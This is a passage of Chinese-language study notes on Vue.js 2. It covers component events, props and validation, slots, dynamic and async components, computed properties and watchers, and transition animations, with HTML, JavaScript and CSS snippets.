<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 子组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;$emit(&#x27;enlarge-text&#x27;)&quot;</span>&gt;</span></span><br><span class="line">  Enlarge text</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 父组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blog-post</span></span></span><br><span class="line"><span class="tag">  <span class="attr">...</span></span></span><br><span class="line"><span class="tag">  @<span class="attr">enlarge-text</span>=<span class="string">&quot;onEnlargeText&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以使用v-model：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 子组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">custom-input</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:value</span>=<span class="string">&quot;searchText&quot;</span></span></span><br><span class="line"><span class="tag">  @<span class="attr">input</span>=<span class="string">&quot;searchText = $event&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">custom-input</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 父组件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">custom-input</span> <span class="attr">v-model</span>=<span class="string">&quot;searchText&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">custom-input</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子组件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;custom-input&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">props</span>: [<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;input</span></span><br><span class="line"><span class="string">      v-bind:value=&quot;value&quot;</span></span><br><span class="line"><span class="string">      v-on:input=&quot;$emit(&#x27;input&#x27;, $event.target.value)&quot;</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>组件可以使用插槽：</p>
<h2 id="组件注册"><a href="#组件注册" class="headerlink" title="组件注册"></a>组件注册</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局注册</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;my-component-name&#x27;</span>, &#123;</span><br><span class="line">  <span class="comment">// ... 选项 ...</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 局部注册</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">ComponentA</span> = &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">components</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;component-a&#x27;</span>: <span class="title class_">ComponentA</span>,</span><br><span class="line">    <span class="string">&#x27;component-b&#x27;</span>: <span class="title class_">ComponentB</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ComponentA</span> <span class="keyword">from</span> <span class="string">&#x27;./ComponentA&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ComponentC</span> <span class="keyword">from</span> <span class="string">&#x27;./ComponentC&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">components</span>: &#123;</span><br><span class="line">    <span class="title class_">ComponentA</span>,</span><br><span class="line">    <span class="title class_">ComponentC</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Prop"><a href="#Prop" class="headerlink" title="Prop"></a>Prop</h2><p>驼峰命名法在使用时应写为短横线分割命名。</p>
<p>类型：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">props</span>: &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">likes</span>: <span class="title class_">Number</span>,</span><br><span class="line">  <span class="attr">isPublished</span>: <span class="title class_">Boolean</span>,</span><br><span class="line">  <span class="attr">commentIds</span>: <span class="title class_">Array</span>,</span><br><span class="line">  <span class="attr">author</span>: <span class="title class_">Object</span>,</span><br><span class="line">  <span class="attr">callback</span>: <span class="title class_">Function</span>,</span><br><span class="line">  <span class="attr">contactsPromise</span>: <span class="title class_">Promise</span> <span class="comment">// or any other constructor</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中，但是反过来则不行。这样会防止从子组件意外改变父级组件的状态，从而导致你的应用的数据流向难以理解。</p>
<p>验证：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;my-component&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="comment">// 基础的类型检查 (`null` 和 `undefined` 会通过任何类型验证)</span></span><br><span class="line">    <span class="attr">propA</span>: <span class="title class_">Number</span>,</span><br><span class="line">    <span class="comment">// 多个可能的类型</span></span><br><span class="line">    <span class="attr">propB</span>: [<span class="title class_">String</span>, <span class="title class_">Number</span>],</span><br><span class="line">    <span class="comment">// 必填的字符串</span></span><br><span class="line">    <span class="attr">propC</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">      <span class="attr">required</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 带有默认值的数字</span></span><br><span class="line">    <span class="attr">propD</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Number</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="number">100</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 带有默认值的对象</span></span><br><span class="line">    <span class="attr">propE</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Object</span>,</span><br><span class="line">      <span class="comment">// 对象或数组默认值必须从一个工厂函数获取</span></span><br><span class="line">      <span class="attr">default</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">message</span>: <span class="string">&#x27;hello&#x27;</span> &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 自定义验证函数</span></span><br><span class="line">    <span class="attr">propF</span>: &#123;</span><br><span class="line">      <span class="attr">validator</span>: <span class="keyword">function</span> (<span class="params">value</span>) &#123;</span><br><span class="line">        <span class="comment">// 这个值必须匹配下列字符串中的一个</span></span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>].<span class="title function_">indexOf</span>(value) !== -<span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;base-checkbox&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">model</span>: &#123;</span><br><span class="line">    <span class="attr">prop</span>: <span class="string">&#x27;checked&#x27;</span>,</span><br><span class="line">    <span class="attr">event</span>: <span class="string">&#x27;change&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">checked</span>: <span class="title class_">Boolean</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;input</span></span><br><span class="line"><span class="string">      type=&quot;checkbox&quot;</span></span><br><span class="line"><span class="string">      v-bind:checked=&quot;checked&quot;</span></span><br><span class="line"><span class="string">      v-on:change=&quot;$emit(&#x27;change&#x27;, $event.target.checked)&quot;</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>绑定原生事件：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;base-input&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">inheritAttrs</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">props</span>: [<span class="string">&#x27;label&#x27;</span>, <span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="attr">inputListeners</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> vm = <span class="variable language_">this</span></span><br><span class="line">      <span class="comment">// `Object.assign` 将所有的对象合并为一个新对象</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;,</span><br><span class="line">        <span class="comment">// 我们从父级添加所有的监听器</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$listeners</span>,</span><br><span class="line">        <span class="comment">// 然后我们添加自定义监听器，</span></span><br><span class="line">        <span class="comment">// 或覆写一些监听器的行为</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 这里确保组件配合 `v-model` 的工作</span></span><br><span class="line">          <span class="attr">input</span>: <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">            vm.$emit(<span class="string">&#x27;input&#x27;</span>, event.<span class="property">target</span>.<span class="property">value</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;label&gt;</span></span><br><span class="line"><span class="string">      &#123;&#123; label &#125;&#125;</span></span><br><span class="line"><span class="string">      &lt;input</span></span><br><span class="line"><span class="string">        v-bind=&quot;$attrs&quot;</span></span><br><span class="line"><span class="string">        v-bind:value=&quot;value&quot;</span></span><br><span class="line"><span class="string">        v-on=&quot;inputListeners&quot;</span></span><br><span class="line"><span class="string">      &gt;</span></span><br><span class="line"><span class="string">    &lt;/label&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="Slot"><a href="#Slot" class="headerlink" title="Slot"></a>Slot</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;sname&quot;</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>  <span class="attr">v-slot:sname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>  #<span class="attr">sname</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="动态组件"><a href="#动态组件" class="headerlink" title="动态组件"></a>动态组件</h2><p>keep-alive 可以保存状态，防止重新渲染。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keep-alive</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:is</span>=<span class="string">&quot;currentTabComponent&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="异步组件"><a href="#异步组件" class="headerlink" title="异步组件"></a>异步组件</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">components</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;my-component&#x27;</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;./my-async-component&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="访问元素-组件"><a href="#访问元素-组件" class="headerlink" title="访问元素 &amp; 组件"></a>访问元素 &amp; 组件</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 访问根</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$root</span></span><br><span class="line"><span class="comment">// 访问父级</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$parent</span>.<span class="property">map</span> || <span class="variable language_">this</span>.<span class="property">$parent</span>.<span class="property">$parent</span>.<span class="property">map</span></span><br><span class="line"><span class="comment">// 访问子级</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">usernameInput</span></span><br></pre></td></tr></table></figure>



<h2 id="计算属性与侦听器"><a href="#计算属性与侦听器" class="headerlink" title="计算属性与侦听器"></a>计算属性与侦听器</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;HelloWorld&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&#x27;Foo&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算属性，依赖不发生变化，就不会重新计算，只会返回缓存</span></span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="attr">reversedMessage</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">message</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 或</span></span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="attr">reversedMessage</span>: &#123;</span><br><span class="line">      <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;,  </span><br><span class="line">      <span class="attr">set</span>: <span class="keyword">function</span>(<span class="params">newValue</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 侦听属性，当需要在数据变化时执行异步或开销较大的操作时可用。</span></span><br><span class="line">  <span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="keyword">function</span> (<span class="params">newValue, oldValue</span>) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="过渡动画"><a href="#过渡动画" class="headerlink" title="过渡动画"></a>过渡动画</h1><p>当插入或删除包含在 transition 组件中的元素时，Vue 将会做以下处理：</p>
<ul>
<li>自动嗅探目标元素是否应用了 CSS 过渡或动画，如果是，在恰当的时机添加&#x2F;删除 CSS 类名。</li>
<li>如果过渡组件提供了 JavaScript 钩子函数，这些钩子函数将在恰当的时机被调用。</li>
<li>如果没有找到 JavaScript 钩子并且也没有检测到 CSS 过渡&#x2F;动画，DOM 操作 (插入&#x2F;删除) 在下一帧中立即执行。(注意：此指浏览器逐帧动画机制，和 Vue 的 nextTick 概念不同)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;show = !show&quot;</span>&gt;</span></span><br><span class="line">    Toggle</span><br><span class="line">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;fade&quot;</span> <span class="attr">:duration</span>=<span class="string">&quot;&#123; enter: 500, leave: 800 &#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;show&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#demo&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">show</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.fade-enter-active</span>, <span class="selector-class">.fade-leave-active</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: opacity .<span class="number">5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.fade-enter</span>, <span class="selector-class">.fade-leave-to</span> <span class="comment">/* .fade-leave-active below version 2.1.8 */</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过渡类名有：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.v-enter</span></span><br><span class="line"><span class="selector-class">.v-enter-active</span></span><br><span class="line"><span class="selector-class">.v-enter-to</span></span><br><span class="line"><span class="selector-class">.v-leave</span></span><br><span class="line"><span class="selector-class">.v-leave-active</span></span><br><span class="line"><span class="selector-class">.v-leave-to</span></span><br></pre></td></tr></table></figure>

<p>也可以使用关键帧动画：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;example-2&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;show = !show&quot;</span>&gt;</span>Toggle show<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;bounce&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;show&quot;</span>&gt;</span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris facilisis enim libero, at lacinia diam fermentum id. Pellentesque habitant morbi tristique senectus et netus.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.bounce-enter-active</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: bounce-in .<span class="number">5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.bounce-leave-active</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: bounce-in .<span class="number">5s</span> reverse;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> bounce-in &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以自定义过渡类名：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.enter-class</span></span><br><span class="line"><span class="selector-class">.enter-active-class</span></span><br><span class="line"><span class="selector-class">.enter-to-class</span> </span><br><span class="line"><span class="selector-class">.leave-class</span></span><br><span class="line"><span class="selector-class">.leave-active-class</span></span><br><span class="line"><span class="selector-class">.leave-to-class</span> </span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/animate.css@3.5.1&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;example-3&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;show = !show&quot;</span>&gt;</span></span><br><span class="line">    Toggle render</span><br><span class="line">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">transition</span></span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;custom-classes-transition&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">enter-active-class</span>=<span class="string">&quot;animated tada&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">leave-active-class</span>=<span class="string">&quot;animated bounceOutRight&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;show&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以使用钩子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:before-enter</span>=<span class="string">&quot;beforeEnter&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:enter</span>=<span class="string">&quot;enter&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:after-enter</span>=<span class="string">&quot;afterEnter&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:enter-cancelled</span>=<span class="string">&quot;enterCancelled&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:before-leave</span>=<span class="string">&quot;beforeLeave&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:leave</span>=<span class="string">&quot;leave&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:after-leave</span>=<span class="string">&quot;afterLeave&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:leave-cancelled</span>=<span class="string">&quot;leaveCancelled&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#example-4&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="attr">beforeEnter</span>: <span class="keyword">function</span> (<span class="params">el</span>) &#123;</span><br><span class="line">      el.<span class="property">style</span>.<span class="property">opacity</span> = <span class="number">0</span></span><br><span class="line">      el.<span class="property">style</span>.<span class="property">transformOrigin</span> = <span class="string">&#x27;left&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">enter</span>: <span class="keyword">function</span> (<span class="params">el, done</span>) &#123;</span><br><span class="line">      <span class="title class_">Velocity</span>(el, &#123; <span class="attr">opacity</span>: <span class="number">1</span>, <span class="attr">fontSize</span>: <span class="string">&#x27;1.4em&#x27;</span> &#125;, &#123; <span class="attr">duration</span>: <span class="number">300</span> &#125;)</span><br><span class="line">      <span class="title class_">Velocity</span>(el, &#123; <span class="attr">fontSize</span>: <span class="string">&#x27;1em&#x27;</span> &#125;, &#123; <span class="attr">complete</span>: done &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">leave</span>: <span class="keyword">function</span> (<span class="params">el, done</span>) &#123;</span><br><span class="line">      <span class="title class_">Velocity</span>(el, &#123; <span class="attr">translateX</span>: <span class="string">&#x27;15px&#x27;</span>, <span class="attr">rotateZ</span>: <span class="string">&#x27;50deg&#x27;</span> &#125;, &#123; <span class="attr">duration</span>: <span class="number">600</span> &#125;)</span><br><span class="line">      <span class="title class_">Velocity</span>(el, &#123; <span class="attr">rotateZ</span>: <span class="string">&#x27;100deg&#x27;</span> &#125;, &#123; <span class="attr">loop</span>: <span class="number">2</span> &#125;)</span><br><span class="line">      <span class="title class_">Velocity</span>(el, &#123;</span><br><span class="line">        <span class="attr">rotateZ</span>: <span class="string">&#x27;45deg&#x27;</span>,</span><br><span class="line">        <span class="attr">translateY</span>: <span class="string">&#x27;30px&#x27;</span>,</span><br><span class="line">        <span class="attr">translateX</span>: <span class="string">&#x27;30px&#x27;</span>,</span><br><span class="line">        <span class="attr">opacity</span>: <span class="number">0</span></span><br><span class="line">      &#125;, &#123; <span class="attr">complete</span>: done &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>设置初始渲染的过渡</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span></span></span><br><span class="line"><span class="tag">  <span class="attr">appear</span></span></span><br><span class="line"><span class="tag">  <span class="attr">appear-class</span>=<span class="string">&quot;custom-appear-class&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">appear-to-class</span>=<span class="string">&quot;custom-appear-to-class&quot;</span> (<span class="attr">2.1.8</span>+)</span></span><br><span class="line"><span class="tag">  <span class="attr">appear-active-class</span>=<span class="string">&quot;custom-appear-active-class&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>过渡模式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;fade&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;out-in&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ... the buttons ... --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>mode：<br>in-out<br>out-in</p>
<p>列表过渡：</p>
